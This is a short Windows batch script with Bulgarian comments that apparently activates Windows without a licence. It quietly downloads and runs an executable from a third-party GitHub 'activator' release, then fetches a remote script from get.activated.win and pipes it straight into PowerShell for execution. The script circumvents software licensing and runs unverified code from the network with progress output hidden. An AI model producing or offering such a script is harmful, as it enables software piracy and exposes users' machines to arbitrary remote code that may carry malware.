@echo off

:: Първи URL за изтегляне
set "url1=https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe"
:: Втори URL за изпълнение
set "url2=https://get.activated.win"

:: Сваляне и стартиране на първия файл
powershell -Command ^
    "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"

:: Изчакване, за да се стартира първият файл
timeout /t 5 /nobreak >nul

:: Изпълнение на втория URL
powershell -Command ^
    "$ProgressPreference = 'SilentlyContinue'; irm '%url2%' | iex"
